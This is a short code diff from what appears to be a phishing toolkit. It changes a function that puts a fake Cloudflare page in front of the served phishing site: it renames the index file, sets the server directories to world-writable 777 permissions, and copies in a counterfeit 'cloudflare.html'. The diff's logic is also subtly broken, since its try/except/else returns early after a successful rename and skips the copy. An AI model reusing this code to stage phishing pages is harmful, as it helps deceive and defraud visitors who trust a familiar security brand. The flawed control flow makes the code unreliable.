@@ -22,7 +22,18 @@ def add_cloudflare_prompt():
 
 
 def add_cloudfare():
-    run_command('mv Server/www/index.* Server/www/home.php && cp WebPages/cloudfare.html Server/www/index.html')
+    #run_command('mv Server/www/index.* Server/www/home.php &
+    # & cp WebPages/cloudfare.html Server/www/index.html')
+    chmod('Server', 0o777)
+    chmod('Server/www', 0o777)
+    try:
+        replace('Server/www/index.php', 'Server/www/home.php')
+    except:
+        replace('Server/www/index.html', 'Server/www/home.php')
+    else:
+        print('Unable to find index file, skipping...')
+        return
+    copyfile('WebPages/cloudflare.html', 'Server/www/index.html')
     print("\n{0}[{1}#{0}]CLOUDFARE FAKE PAGE{0} ADDED...".format(default_palette[0], default_palette[4]))
     wait(1)
 
